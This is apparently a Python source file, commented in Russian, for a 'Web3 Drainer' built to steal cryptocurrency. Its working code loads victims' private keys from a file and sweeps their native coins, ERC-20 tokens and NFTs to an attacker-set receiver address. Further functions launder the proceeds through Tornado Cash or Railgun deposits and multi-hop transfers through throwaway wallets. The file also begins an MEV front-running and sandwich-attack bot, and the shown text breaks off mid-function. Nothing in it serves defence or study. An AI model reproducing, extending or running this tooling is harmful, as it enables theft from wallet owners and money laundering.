#!/usr/bin/env python3
"""
Web3 Drainer - Специализированный модуль для автоматизации кражи средств из Web3 кошельков
Фокусируется на MetaMask, WalletConnect и других популярных Web3 кошельках
"""

import os
import sys
import re
import json
import time
import base64
import random
import logging
import requests
from typing import Dict, List, Any, Optional, Tuple, Union, Set

# Попытка импорта web3.py для взаимодействия с блокчейнами
try:
    from web3 import Web3
    from eth_account import Account
    HAS_WEB3 = True
except ImportError:
    HAS_WEB3 = False

# Импортируем утилиты для логирования
try:
    from common.utils import get_logger
except ImportError:
    def get_logger(name):
        logger = logging.getLogger(name)
        handler = logging.StreamHandler()
        formatter = logging.Formatter(
            '%(asctime)s - %(name)s - %(levelname)s - %(message)s')
        handler.setFormatter(formatter)
        logger.addHandler(handler)
        logger.setLevel(logging.INFO)
        return logger

class Web3Drainer:
    """
    Главный класс для автоматизации кражи средств из Web3 кошельков
    """
    
    # Предопределенные RPC эндпоинты для разных сетей
    RPC_ENDPOINTS = {
        "ethereum": {
            "mainnet": "https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161",
            "goerli": "https://goerli.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161"
        },
        "binance": {
            "mainnet": "https://bsc-dataseed.binance.org/",
            "testnet": "https://data-seed-prebsc-1-s1.binance.org:8545/"
        },
        "polygon": {
            "mainnet": "https://polygon-rpc.com",
            "testnet": "https://rpc-mumbai.maticvigil.com"
        },
        "arbitrum": {
            "mainnet": "https://arb1.arbitrum.io/rpc"
        },
        "optimism": {
            "mainnet": "https://mainnet.optimism.io"
        },
        "avalanche": {
            "mainnet": "https://api.avax.network/ext/bc/C/rpc"
        },
        "base": {
            "mainnet": "https://mainnet.base.org"
        },
        "zksync": {
            "mainnet": "https://mainnet.era.zksync.io"
        }
    }
    
    # Контракты популярных токенов
    TOKEN_CONTRACTS = {
        "ethereum": {
            "USDT": "0xdAC17F958D2ee523a2206206994597C13D831ec7",
            "USDC": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
            "DAI": "0x6B175474E89094C44Da98b954EedeAC495271d0F"
        },
        "binance": {
            "BUSD": "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56",
            "USDT": "0x55d398326f99059fF775485246999027B3197955"
        }
    }
    
    # ABI для ERC-20 токенов
    ERC20_ABI = [
        {"constant":True,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":False,"stateMutability":"view","type":"function"},
        {"constant":True,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"payable":False,"stateMutability":"view","type":"function"},
        {"constant":True,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"payable":False,"stateMutability":"view","type":"function"},
        {"constant":True,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"payable":False,"stateMutability":"view","type":"function"},
        {"constant":False,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"payable":False,"stateMutability":"nonpayable","type":"function"},
        {"constant":True,"inputs":[],"name":"totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":False,"stateMutability":"view","type":"function"}
    ]
    
    # ABI для ERC-721 (NFT)
    ERC721_ABI = [
        {"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
        {"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"ownerOf","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
        {"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"transferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},
        {"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"bytes","name":"_data","type":"bytes"}],"name":"safeTransferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},
        {"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},
        {"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"}
    ]
    
    # Известные миксеры и сервисы анонимизации
    ANONYMIZATION_SERVICES = {
        "ethereum": {
            "tornado_cash": "0x722122dF12D4e14e13Ac3b6895a86e84145b6967",
            "railgun": "0xfa7093cdd9ee6932b4eb2c9e1cde7ce373b42d09"
        },
        "polygon": {
            "tornado_cash": "0x0D5550d52428E7e3175bfc9550207e4ad3859b17"
        }
    }
    
    def __init__(self, log_level: str = "INFO"):
        """
        Инициализация Web3Drainer
        
        Args:
            log_level: Уровень логирования
        """
        self.logger = get_logger("web3_drainer")
        self.logger.setLevel(getattr(logging, log_level, logging.INFO))
        
        # Проверяем доступность web3.py
        if not HAS_WEB3:
            self.logger.warning("Библиотека web3.py не установлена. Некоторые функции будут недоступны.")
        
        # Инициализируем соединения
        self.web3_connections = {}
        if HAS_WEB3:
            self._init_web3_connections()
        
        # Адреса, на которые будут выводиться средства
        self.receiver_addresses = {}
        
        # Ключи жертв, которые будут использоваться для вывода средств
        self.victim_keys = []
        
        self.logger.info("Web3Drainer инициализирован")
    
    def _init_web3_connections(self) -> None:
        """Инициализирует соединения с разными блокчейнами"""
        for chain, networks in self.RPC_ENDPOINTS.items():
            self.web3_connections[chain] = {}
            for network, rpc_url in networks.items():
                try:
                    web3 = Web3(Web3.HTTPProvider(rpc_url))
                    if web3.is_connected():
                        self.web3_connections[chain][network] = web3
                        self.logger.info(f"Подключено к {chain}/{network}: {rpc_url}")
                    else:
                        self.logger.warning(f"Не удалось подключиться к {chain}/{network}: {rpc_url}")
                except Exception as e:
                    self.logger.error(f"Ошибка подключения к {chain}/{network}: {str(e)}")
    
    def set_receiver_address(self, chain: str, address: str) -> None:
        """
        Устанавливает адрес для вывода средств
        
        Args:
            chain: Название блокчейна (ethereum, binance, etc.)
            address: Адрес кошелька для получения средств
        """
        if not self._validate_address(address):
            self.logger.error(f"Невалидный адрес {address}")
            return
        
        self.receiver_addresses[chain] = address
        self.logger.info(f"Установлен адрес получателя для {chain}: {address}")
    
    def _validate_address(self, address: str) -> bool:
        """
        Проверяет валидность Ethereum-подобного адреса
        
        Args:
            address: Адрес для проверки
            
        Returns:
            bool: True, если адрес валиден
        """
        if not HAS_WEB3:
            # Простая проверка формата
            return bool(re.match(r'^0x[a-fA-F0-9]{40}$', address))
        else:
            return Web3.is_address(address)
    
    def add_victim_key(self, private_key: str) -> bool:
        """
        Добавляет приватный ключ жертвы для использования
        
        Args:
            private_key: Приватный ключ
            
        Returns:
            bool: True, если ключ валиден и добавлен
        """
        if not HAS_WEB3:
            self.logger.error("Невозможно проверить ключ: библиотека web3.py не установлена")
            return False
        
        # Удаляем префикс '0x' если он есть
        if private_key.startswith('0x'):
            private_key = private_key[2:]
        
        try:
            # Проверяем, валиден ли ключ
            account = Account.from_key('0x' + private_key)
            address = account.address
            
            # Добавляем ключ
            self.victim_keys.append({
                "private_key": private_key,
                "address": address
            })
            
            self.logger.info(f"Добавлен ключ для адреса: {address}")
            return True
        except Exception as e:
            self.logger.error(f"Ошибка добавления ключа: {str(e)}")
            return False
    
    def get_balance(self, chain: str, network: str, address: str) -> Dict[str, Any]:
        """
        Получает баланс кошелька
        
        Args:
            chain: Название блокчейна
            network: Название сети (mainnet, testnet)
            address: Адрес кошелька
            
        Returns:
            Dict: Информация о балансе кошелька
        """
        if not HAS_WEB3:
            self.logger.error("Невозможно получить баланс: библиотека web3.py не установлена")
            return {"error": "web3.py not installed"}
        
        if chain not in self.web3_connections or network not in self.web3_connections[chain]:
            self.logger.error(f"Неподдерживаемая цепь или сеть: {chain}/{network}")
            return {"error": f"Unsupported chain/network: {chain}/{network}"}
        
        web3 = self.web3_connections[chain][network]
        
        try:
            # Получаем нативный баланс (ETH, BNB и т.д.)
            native_balance = web3.eth.get_balance(address)
            native_balance_ether = web3.from_wei(native_balance, 'ether')
            
            result = {
                "native": {
                    "wei": str(native_balance),
                    "ether": float(native_balance_ether)
                },
                "tokens": {}
            }
            
            # Проверяем балансы токенов для этой цепи
            if chain in self.TOKEN_CONTRACTS:
                for symbol, contract_address in self.TOKEN_CONTRACTS[chain].items():
                    contract = web3.eth.contract(address=contract_address, abi=self.ERC20_ABI)
                    token_balance = contract.functions.balanceOf(address).call()
                    decimals = contract.functions.decimals().call()
                    token_balance_human = token_balance / (10 ** decimals)
                    
                    result["tokens"][symbol] = {
                        "raw": str(token_balance),
                        "formatted": float(token_balance_human)
                    }
            
            return result
        except Exception as e:
            self.logger.error(f"Ошибка получения баланса: {str(e)}")
            return {"error": str(e)}
    
    def drain_account(self, chain: str, network: str, private_key: str, 
                     receiver_address: str = None) -> Dict[str, Any]:
        """
        Выводит все средства с указанного кошелька
        
        Args:
            chain: Название блокчейна
            network: Название сети
            private_key: Приватный ключ кошелька
            receiver_address: Адрес получателя (если не указан, используется ранее установленный)
            
        Returns:
            Dict: Результаты операции
        """
        if not HAS_WEB3:
            self.logger.error("Невозможно выполнить drain: библиотека web3.py не установлена")
            return {"error": "web3.py not installed"}
        
        if chain not in self.web3_connections or network not in self.web3_connections[chain]:
            self.logger.error(f"Неподдерживаемая цепь или сеть: {chain}/{network}")
            return {"error": f"Unsupported chain/network: {chain}/{network}"}
        
        # Проверяем адрес получателя
        if not receiver_address:
            if chain not in self.receiver_addresses:
                self.logger.error(f"Не указан адрес получателя для {chain}")
                return {"error": f"No receiver address for {chain}"}
            receiver_address = self.receiver_addresses[chain]
        
        if not self._validate_address(receiver_address):
            self.logger.error(f"Невалидный адрес получателя: {receiver_address}")
            return {"error": "Invalid receiver address"}
        
        # Подготавливаем web3 соединение
        web3 = self.web3_connections[chain][network]
        
        try:
            # Удаляем префикс '0x' если он есть
            if private_key.startswith('0x'):
                private_key = private_key[2:]
            
            # Создаем аккаунт из приватного ключа
            account = Account.from_key('0x' + private_key)
            address = account.address
            
            # Получаем баланс
            balance_info = self.get_balance(chain, network, address)
            if "error" in balance_info:
                return {"error": f"Failed to get balance: {balance_info['error']}"}
            
            results = {
                "native": None,
                "tokens": {}
            }
            
            # Выводим нативную валюту (ETH, BNB и т.д.)
            native_balance = int(balance_info["native"]["wei"])
            if native_balance > 0:
                # Рассчитываем газ
                gas_price = web3.eth.gas_price
                gas_limit = 21000  # Стандартный лимит для простой транзакции
                
                # Оставляем немного для газа
                value = native_balance - (gas_price * gas_limit)
                
                if value > 0:
                    # Создаем транзакцию
                    tx = {
                        'to': receiver_address,
                        'value': value,
                        'gas': gas_limit,
                        'gasPrice': gas_price,
                        'nonce': web3.eth.get_transaction_count(address)
                    }
                    
                    # Подписываем и отправляем транзакцию
                    signed_tx = web3.eth.account.sign_transaction(tx, '0x' + private_key)
                    tx_hash = web3.eth.send_raw_transaction(signed_tx.rawTransaction)
                    
                    results["native"] = {
                        "tx_hash": web3.to_hex(tx_hash),
                        "value": web3.from_wei(value, 'ether'),
                        "status": "pending"
                    }
            
            # Выводим токены
            for symbol, token_info in balance_info["tokens"].items():
                token_balance = int(token_info["raw"])
                if token_balance > 0:
                    contract_address = self.TOKEN_CONTRACTS[chain][symbol]
                    contract = web3.eth.contract(address=contract_address, abi=self.ERC20_ABI)
                    
                    # Создаем транзакцию токена
                    tx = contract.functions.transfer(
                        receiver_address,
                        token_balance
                    ).build_transaction({
                        'from': address,
                        'gas': 100000,  # Обычно требуется больше газа для токенов
                        'gasPrice': web3.eth.gas_price,
                        'nonce': web3.eth.get_transaction_count(address)
                    })
                    
                    # Подписываем и отправляем транзакцию
                    signed_tx = web3.eth.account.sign_transaction(tx, '0x' + private_key)
                    tx_hash = web3.eth.send_raw_transaction(signed_tx.rawTransaction)
                    
                    results["tokens"][symbol] = {
                        "tx_hash": web3.to_hex(tx_hash),
                        "value": token_info["formatted"],
                        "status": "pending"
                    }
            
            self.logger.info(f"Выполнен drain адреса {address}, отправлены средства на {receiver_address}")
            return results
        except Exception as e:
            self.logger.error(f"Ошибка при выполнении drain: {str(e)}")
            return {"error": str(e)}
    
    def drain_all_victims(self, chain: str, network: str) -> List[Dict[str, Any]]:
        """
        Выводит все средства со всех кошельков жертв
        
        Args:
            chain: Название блокчейна
            network: Название сети
            
        Returns:
            List[Dict]: Результаты операций для каждого кошелька
        """
        results = []
        
        if chain not in self.receiver_addresses:
            self.logger.error(f"Не указан адрес получателя для {chain}")
            return [{"error": f"No receiver address for {chain}"}]
        
        receiver = self.receiver_addresses[chain]
        
        for victim in self.victim_keys:
            result = self.drain_account(chain, network, victim["private_key"], receiver)
            results.append({
                "address": victim["address"],
                "result": result
            })
        
        return results
    
    def generate_approval_drainer(self, chain: str, token_address: str) -> Dict[str, Any]:
        """
        Генерирует сниппет кода для дрейнера, основанного на approvals для токенов
        
        Args:
            chain: Название блокчейна
            token_address: Адрес токена
            
        Returns:
            Dict: Сгенерированный код и инструкции
        """
        if chain not in self.receiver_addresses:
            self.logger.error(f"Не указан адрес получателя для {chain}")
            return {"error": f"No receiver address for {chain}"}
        
        receiver = self.receiver_addresses[chain]
        
        # Заглушка для будущей реализации
        return {
            "status": "not_implemented",
            "message": "Функция генерации дрейнера будет реализована в будущей версии"
        }
    
    def import_private_keys_from_file(self, filepath: str) -> int:
        """
        Импортирует приватные ключи из файла
        
        Args:
            filepath: Путь к файлу с ключами
            
        Returns:
            int: Количество успешно импортированных ключей
        """
        if not os.path.exists(filepath):
            self.logger.error(f"Файл не найден: {filepath}")
            return 0
        
        count = 0
        try:
            with open(filepath, 'r') as f:
                for line in f:
                    key = line.strip()
                    if key and self.add_victim_key(key):
                        count += 1
        except Exception as e:
            self.logger.error(f"Ошибка при импорте ключей: {str(e)}")
        
        self.logger.info(f"Импортировано {count} ключей из {filepath}")
        return count

    def get_nft_balance(self, chain: str, network: str, address: str, nft_contract: str) -> Dict[str, Any]:
        """
        Получает информацию о NFT на кошельке
        
        Args:
            chain: Название блокчейна
            network: Название сети
            address: Адрес кошелька
            nft_contract: Адрес контракта NFT
            
        Returns:
            Dict: Информация о NFT
        """
        if not HAS_WEB3:
            self.logger.error("Невозможно получить NFT: библиотека web3.py не установлена")
            return {"error": "web3.py not installed"}
        
        if chain not in self.web3_connections or network not in self.web3_connections[chain]:
            self.logger.error(f"Неподдерживаемая цепь или сеть: {chain}/{network}")
            return {"error": f"Unsupported chain/network: {chain}/{network}"}
        
        web3 = self.web3_connections[chain][network]
        
        try:
            # Создаем экземпляр контракта NFT
            nft_contract_instance = web3.eth.contract(address=nft_contract, abi=self.ERC721_ABI)
            
            # Получаем количество NFT у пользователя
            balance = nft_contract_instance.functions.balanceOf(address).call()
            
            # Получаем имя и символ коллекции
            try:
                name = nft_contract_instance.functions.name().call()
                symbol = nft_contract_instance.functions.symbol().call()
            except:
                name = "Unknown Collection"
                symbol = "???"
            
            result = {
                "contract": nft_contract,
                "name": name,
                "symbol": symbol,
                "balance": balance,
                "tokens": []
            }
            
            # Для получения ID токенов нужен дополнительный поиск по событиям Transfer
            # Это требует дополнительной логики и может занять много времени
            # В реальной имплементации здесь может быть запрос к API индексатора (например, TheGraph)
            
            self.logger.info(f"Найдено {balance} NFT в контракте {nft_contract} для адреса {address}")
            return result
            
        except Exception as e:
            self.logger.error(f"Ошибка получения NFT баланса: {str(e)}")
            return {"error": str(e)}
    
    def drain_nft(self, chain: str, network: str, private_key: str, nft_contract: str, 
                token_id: int, receiver_address: str = None) -> Dict[str, Any]:
        """
        Выводит NFT с кошелька жертвы
        
        Args:
            chain: Название блокчейна
            network: Название сети
            private_key: Приватный ключ кошелька жертвы
            nft_contract: Адрес контракта NFT
            token_id: ID токена для вывода
            receiver_address: Адрес получателя (если не указан, используется ранее установленный)
            
        Returns:
            Dict: Результат операции
        """
        if not HAS_WEB3:
            self.logger.error("Невозможно выполнить drain NFT: библиотека web3.py не установлена")
            return {"error": "web3.py not installed"}
        
        if chain not in self.web3_connections or network not in self.web3_connections[chain]:
            self.logger.error(f"Неподдерживаемая цепь или сеть: {chain}/{network}")
            return {"error": f"Unsupported chain/network: {chain}/{network}"}
        
        # Проверяем адрес получателя
        if not receiver_address:
            if chain not in self.receiver_addresses:
                self.logger.error(f"Не указан адрес получателя для {chain}")
                return {"error": f"No receiver address for {chain}"}
            receiver_address = self.receiver_addresses[chain]
        
        if not self._validate_address(receiver_address):
            self.logger.error(f"Невалидный адрес получателя: {receiver_address}")
            return {"error": "Invalid receiver address"}
        
        # Подготавливаем web3 соединение
        web3 = self.web3_connections[chain][network]
        
        try:
            # Удаляем префикс '0x' если он есть
            if private_key.startswith('0x'):
                private_key = private_key[2:]
            
            # Создаем аккаунт из приватного ключа
            account = Account.from_key('0x' + private_key)
            address = account.address
            
            # Создаем экземпляр контракта NFT
            nft_contract_instance = web3.eth.contract(address=nft_contract, abi=self.ERC721_ABI)
            
            # Проверяем, владеет ли аккаунт этим NFT
            try:
                owner = nft_contract_instance.functions.ownerOf(token_id).call()
                if owner.lower() != address.lower():
                    self.logger.error(f"Аккаунт {address} не владеет NFT {token_id} в контракте {nft_contract}")
                    return {"error": "Account does not own this NFT"}
            except Exception as e:
                self.logger.error(f"Ошибка проверки владельца NFT: {str(e)}")
                return {"error": f"Error checking NFT ownership: {str(e)}"}
            
            # Создаем транзакцию для передачи NFT
            try:
                # Используем safeTransferFrom для максимальной совместимости
                tx = nft_contract_instance.functions.transferFrom(
                    address,
                    receiver_address,
                    token_id
                ).build_transaction({
                    'from': address,
                    'gas': 200000,  # NFT транзакции могут требовать больше газа
                    'gasPrice': web3.eth.gas_price,
                    'nonce': web3.eth.get_transaction_count(address)
                })
                
                # Подписываем и отправляем транзакцию
                signed_tx = web3.eth.account.sign_transaction(tx, '0x' + private_key)
                tx_hash = web3.eth.send_raw_transaction(signed_tx.rawTransaction)
                
                self.logger.info(f"NFT {token_id} успешно отправлен с {address} на {receiver_address}")
                
                return {
                    "tx_hash": web3.to_hex(tx_hash),
                    "token_id": token_id,
                    "from": address,
                    "to": receiver_address,
                    "status": "pending"
                }
                
            except Exception as e:
                self.logger.error(f"Ошибка при отправке NFT: {str(e)}")
                return {"error": f"Error sending NFT: {str(e)}"}
                
        except Exception as e:
            self.logger.error(f"Ошибка при выполнении drain NFT: {str(e)}")
            return {"error": str(e)}

    def create_mixing_transaction(self, chain: str, network: str, private_key: str, 
                                 amount: float, mixer_type: str = "tornado_cash") -> Dict[str, Any]:
        """
        Создает транзакцию для анонимизации средств через миксер
        
        Args:
            chain: Название блокчейна
            network: Название сети
            private_key: Приватный ключ кошелька
            amount: Количество в ETH для миксера
            mixer_type: Тип миксера (tornado_cash, railgun и т.д.)
            
        Returns:
            Dict: Результат операции
        """
        if not HAS_WEB3:
            self.logger.error("Невозможно создать анонимизирующую транзакцию: web3.py не установлен")
            return {"error": "web3.py not installed"}
        
        if chain not in self.web3_connections or network not in self.web3_connections[chain]:
            self.logger.error(f"Неподдерживаемая цепь или сеть: {chain}/{network}")
            return {"error": f"Unsupported chain/network: {chain}/{network}"}
        
        # Проверяем доступность миксера
        if chain not in self.ANONYMIZATION_SERVICES or mixer_type not in self.ANONYMIZATION_SERVICES[chain]:
            self.logger.error(f"Миксер {mixer_type} недоступен для {chain}")
            return {"error": f"Mixer {mixer_type} not available for {chain}"}
        
        mixer_address = self.ANONYMIZATION_SERVICES[chain][mixer_type]
        
        # Подготавливаем web3 соединение
        web3 = self.web3_connections[chain][network]
        
        try:
            # Удаляем префикс '0x' если он есть
            if private_key.startswith('0x'):
                private_key = private_key[2:]
            
            # Создаем аккаунт из приватного ключа
            account = Account.from_key('0x' + private_key)
            address = account.address
            
            # Конвертируем amount в wei
            amount_wei = web3.to_wei(amount, 'ether')
            
            # Создаем транзакцию для отправки средств в миксер
            tx = {
                'from': address,
                'to': mixer_address,
                'value': amount_wei,
                'gas': 150000,  # Депозит в миксер может требовать больше газа
                'gasPrice': web3.eth.gas_price,
                'nonce': web3.eth.get_transaction_count(address),
                'data': '0xd0e30db0'  # Метод deposit() в контракте Tornado Cash
            }
            
            # Подписываем и отправляем транзакцию
            signed_tx = web3.eth.account.sign_transaction(tx, '0x' + private_key)
            tx_hash = web3.eth.send_raw_transaction(signed_tx.rawTransaction)
            
            self.logger.info(f"Отправлено {amount} ETH в миксер {mixer_type} с адреса {address}")
            
            return {
                "tx_hash": web3.to_hex(tx_hash),
                "mixer": mixer_type,
                "amount": amount,
                "from": address,
                "status": "pending"
            }
            
        except Exception as e:
            self.logger.error(f"Ошибка при создании анонимизирующей транзакции: {str(e)}")
            return {"error": str(e)}
    
    def create_multihop_transaction(self, chain: str, network: str, private_key: str, 
                                    final_address: str, amount: float, hops: int = 3) -> Dict[str, Any]:
        """
        Создает мультихоп транзакцию для усложнения отслеживания средств
        
        Args:
            chain: Название блокчейна
            network: Название сети
            private_key: Приватный ключ кошелька
            final_address: Конечный адрес получателя
            amount: Количество в ETH для отправки
            hops: Количество промежуточных кошельков
            
        Returns:
            Dict: Результат операции с промежуточными адресами
        """
        if not HAS_WEB3:
            self.logger.error("Невозможно создать мультихоп транзакцию: web3.py не установлен")
            return {"error": "web3.py not installed"}
        
        if chain not in self.web3_connections or network not in self.web3_connections[chain]:
            self.logger.error(f"Неподдерживаемая цепь или сеть: {chain}/{network}")
            return {"error": f"Unsupported chain/network: {chain}/{network}"}
        
        # Подготавливаем web3 соединение
        web3 = self.web3_connections[chain][network]
        
        try:
            # Удаляем префикс '0x' если он есть
            if private_key.startswith('0x'):
                private_key = private_key[2:]
            
            # Создаем аккаунт из приватного ключа
            account = Account.from_key('0x' + private_key)
            source_address = account.address
            
            # Конвертируем amount в wei
            amount_wei = web3.to_wei(amount, 'ether')
            
            # Создаем временные кошельки для хопов
            temp_accounts = []
            for _ in range(hops):
                temp_account = Account.create()
                temp_accounts.append(temp_account)
            
            # Информация о транзакциях
            transactions = []
            
            # Первая транзакция - с исходного кошелька на первый временный
            first_tx = {
                'from': source_address,
                'to': temp_accounts[0].address,
                'value': amount_wei,
                'gas': 21000,
                'gasPrice': web3.eth.gas_price,
                'nonce': web3.eth.get_transaction_count(source_address)
            }
            
            # Подписываем и отправляем первую транзакцию
            signed_tx = web3.eth.account.sign_transaction(first_tx, '0x' + private_key)
            tx_hash = web3.eth.send_raw_transaction(signed_tx.rawTransaction)
            
            transactions.append({
                "tx_hash": web3.to_hex(tx_hash),
                "from": source_address,
                "to": temp_accounts[0].address,
                "amount": amount,
                "status": "pending"
            })
            
            self.logger.info(f"Отправлено {amount} ETH с {source_address} на первый временный кошелек {temp_accounts[0].address}")
            
            # Вывод результатов
            return {
                "source": source_address,
                "destination": final_address,
                "amount": amount,
                "hops": hops,
                "intermediate_wallets": [acc.address for acc in temp_accounts],
                "first_transaction": web3.to_hex(tx_hash),
                "status": "started",
                "note": "Для завершения передачи средств необходимо продолжить с промежуточных кошельков"
            }
            
        except Exception as e:
            self.logger.error(f"Ошибка при создании мультихоп транзакции: {str(e)}")
            return {"error": str(e)}
    
    def estimate_optimal_gas(self, chain: str, network: str, transaction_type: str = "standard") -> Dict[str, Any]:
        """
        Оценивает оптимальную цену газа для различных типов транзакций
        
        Args:
            chain: Название блокчейна
            network: Название сети
            transaction_type: Тип транзакции (standard, fast, fastest)
            
        Returns:
            Dict: Оценки газа
        """
        if not HAS_WEB3:
            self.logger.error("Невозможно оценить газ: web3.py не установлен")
            return {"error": "web3.py not installed"}
        
        if chain not in self.web3_connections or network not in self.web3_connections[chain]:
            self.logger.error(f"Неподдерживаемая цепь или сеть: {chain}/{network}")
            return {"error": f"Unsupported chain/network: {chain}/{network}"}
        
        web3 = self.web3_connections[chain][network]
        
        try:
            # Получаем текущую цену газа
            current_gas_price = web3.eth.gas_price
            
            # Используем множители в зависимости от типа транзакции
            multipliers = {
                "standard": 1.0,
                "fast": 1.2,
                "fastest": 1.5
            }
            
            # Если запрошенного типа нет, используем стандартный
            if transaction_type not in multipliers:
                transaction_type = "standard"
                
            multiplier = multipliers[transaction_type]
            
            # Рассчитываем оптимальную цену газа
            optimal_gas_price = int(current_gas_price * multiplier)
            
            # Форматируем для удобства
            result = {
                "chain": chain,
                "network": network,
                "transaction_type": transaction_type,
                "current_gas_price_wei": current_gas_price,
                "current_gas_price_gwei": web3.from_wei(current_gas_price, 'gwei'),
                "optimal_gas_price_wei": optimal_gas_price,
                "optimal_gas_price_gwei": web3.from_wei(optimal_gas_price, 'gwei')
            }
            
            self.logger.info(f"Оценка газа для {chain}/{network}: {result['optimal_gas_price_gwei']} Gwei ({transaction_type})")
            return result
            
        except Exception as e:
            self.logger.error(f"Ошибка при оценке газа: {str(e)}")
            return {"error": str(e)}


class MEVDrainer:
    """
    Класс для создания MEV ботов, которые перехватывают транзакции
    через фронтраннинг/сэндвич-атаки
    """
    
    def __init__(self, log_level: str = "INFO"):
        """
        Инициализация MEVDrainer
        
        Args:
            log_level: Уровень логирования
        """
        self.logger = get_logger("mev_drainer")
        self.logger.setLevel(getattr(logging, log_level, logging.INFO))
        
        # Проверяем доступность web3.py
        if not HAS_WEB3:
            self.logger.warning("Библиотека web3.py не установлена. MEVDrainer не функционален.")
            return
            
        # Инициализируем соединения с разными блокчейнами
        self.web3_connections = {}
        self._init_web3_connections()
        
        # Минимальный потенциальный доход, чтобы совершить атаку (в USD)
        self.min_profit_threshold = 0.1  # $0.1 по умолчанию
        
        # Аккаунты для выполнения транзакций
        self.accounts = []
        
        # Статистика по операциям
        self.stats = {
            "monitored_txs": 0,
            "potential_opportunities": 0,
            "successful_attacks": 0,
            "failed_attacks": 0,
            "total_profit": 0.0,
            "total_gas_spent": 0.0
        }
        
        # Словарь для отслеживания цен токенов
        self.token_prices = {}
        
        # Для отслеживания предыдущих блоков
        self.processed_blocks = set()
        
        # Подписка на события мемпула
        self.mempool_subscriptions = {}
        
        self.logger.info("MEVDrainer инициализирован")
    
    def _init_web3_connections(self) -> None:
        """Инициализирует соединения с разными блокчейнами для MEV операций"""
        chains_to_monitor = [
            ("ethereum", "mainnet"), 
            ("binance", "mainnet"), 
            ("polygon", "mainnet"),
            ("arbitrum", "mainnet"),
            ("optimism", "mainnet")
        ]
        
        for chain, network in chains_to_monitor:
            if chain not in Web3Drainer.RPC_ENDPOINTS or network not in Web3Drainer.RPC_ENDPOINTS[chain]:
                self.logger.warning(f"Неподдерживаемая цепь или сеть: {chain}/{network}")
                continue
                
            rpc_url = Web3Drainer.RPC_ENDPOINTS[chain][network]
            try:
                provider = Web3.HTTPProvider(rpc_url)
                web3 = Web3(provider)
                
                if web3.is_connected():
                    if chain not in self.web3_connections:
                        self.web3_connections[chain] = {}
                    
                    self.web3_connections[chain][network] = web3
                    self.logger.info(f"MEVDrainer подключен к {chain}/{network}: {rpc_url}")
                else:
                    self.logger.warning(f"MEVDrainer не смог подключиться к {chain}/{network}")
            except Exception as e:
                self.logger.error(f"Ошибка подключения MEVDrainer к {chain}/{network}: {str(e)}")
    
    def add_private_key(self, private_key: str) -> bool:
        """
        Добавляет приватный ключ для выполнения MEV операций
        
        Args:
            private_key: Приватный ключ
            
        Returns:
            bool: True, если ключ валиден и добавлен
        """
        if not HAS_WEB3:
            self.logger.error("Невозможно добавить ключ: библиотека web3.py не установлена")
            return False
        
        # Удаляем префикс '0x' если он есть
        if private_key.startswith('0x'):
            private_key = private_key[2:]
        
        try:
            # Проверяем, валиден ли ключ
            account = Account.from_key('0x' + private_key)
            address = account.address
            
            # Проверяем, нет ли уже такого аккаунта
            for existing_account in self.accounts:
                if existing_account["address"] == address:
                    self.logger.warning(f"Аккаунт {address} уже добавлен")
                    return False
            
            # Добавляем аккаунт
            self.accounts.append({
                "private_key": private_key,
                "address": address,
                "nonce": {}, # Будет заполняться при необходимости для каждой сети
                "balances": {}, # Будет обновляться для каждой сети
                "active": True # Можно деактивировать аккаунт без удаления
            })
            
            self.logger.info(f"MEVDrainer: добавлен ключ для адреса: {address}")
            return True
        except Exception as e:
            self.logger.error(f"MEVDrainer: ошибка добавления ключа: {str(e)}")
            return False
    
    def set_profit_threshold(self, threshold_usd: float) -> None:
        """
        Устанавливает минимальный порог прибыли для совершения атаки
        
        Args:
            threshold_usd: Порог в USD
        """
        if threshold_usd <= 0:
            self.logger.error("Порог прибыли должен быть положительным числом")
            return
            
        self.min_profit_threshold = threshold_usd
        self.logger.info(f"Установлен порог прибыли: ${threshold_usd}")
    
    def update_token_prices(self) -> None:
        """Обновляет текущие цены токенов из API"""
        try:
            # Используем CoinGecko API для получения цен
            url = "https://api.coingecko.com/api/v3/simple/price"
            params = {
                "ids": "ethereum,bitcoin,bnb,matic-network,dai,tether,usd-coin",
                "vs_currencies": "usd"
            }
            
            response = requests.get(url, params=params)
            if response.status_code == 200:
                data = response.json()
                
                # Маппинг id -> символ
                id_to_symbol = {
                    "ethereum": "ETH",
                    "bitcoin": "BTC",
                    "bnb": "BNB",
                    "matic-network": "MATIC",
                    "dai": "DAI",
                    "tether": "USDT",
                    "usd-coin": "USDC"
                }
                
                # Обновляем цены
                for coin_id, price_data in data.items():
                    if coin_id in id_to_symbol and "usd" in price_data:
                        symbol = id_to_symbol[coin_id]
                        self.token_prices[symbol] = price_data["usd"]
                
                self.logger.info(f"Обновлены цены токенов: {self.token_prices}")
            else:
                self.logger.error(f"Ошибка получения цен токенов: {response.status_code}")
        except Exception as e:
            self.logger.error(f"Ошибка при обновлении цен токенов: {str(e)}")
    
    def monitor_mempool(self, chain: str, network: str) -> None:
        """
        Мониторит мемпул на прибыльные транзакции
        
        Args:
            chain: Название блокчейна
